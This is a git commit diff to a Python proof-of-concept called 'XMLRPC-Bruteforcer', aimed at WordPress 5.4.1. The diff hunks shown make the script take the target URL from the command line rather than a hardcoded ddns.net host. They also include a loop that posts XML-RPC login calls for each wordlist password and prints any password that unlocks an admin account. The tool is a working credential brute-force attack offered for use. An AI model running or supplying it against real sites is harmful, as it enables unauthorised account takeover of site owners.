7f26e6b4896a0fe7665713b24198f1088d34d189
Caner <2broglie@gmail.com>
2020-07-06 22:17:27 +0200

    Update poc.py

--- poc.py
+++ poc.py
@@ -5,13 +5,13 @@ XMLRPC-Bruteforcer
 Author: KORKUT Caner
 06-07-2020
 Tested on WordPress Core 5.4.1
-Usage: python3 xmlrpc_poc.py username wordlist.txt 
+Usage: python3 xmlrpc_poc.py http://target.com username wordlist.txt 
 """
 
 import requests
 import sys 
 
-f = open(sys.argv[2], "r")
+f = open(sys.argv[3], "r")
 wordlist = f.readlines()
 f.close()
 
@@ -28,8 +28,8 @@ for password in wordlist:
 	</param>
 	</params>
 	</methodCall>
-	""".format(sys.argv[1], password)
+	""".format(sys.argv[2], password)
 	headers = {'Content-Type': 'application/xml'} # set what your server accepts
-	rep = requests.post('http://phonebest.ddns.net/xmlrpc.php', data=xml, headers=headers).text
+	rep = requests.post('{}/xmlrpc.php'.format(sys.argv[1]), data=xml, headers=headers).text
 	if "isAdmin" in rep:
 		print("Mot de passe: ", password)
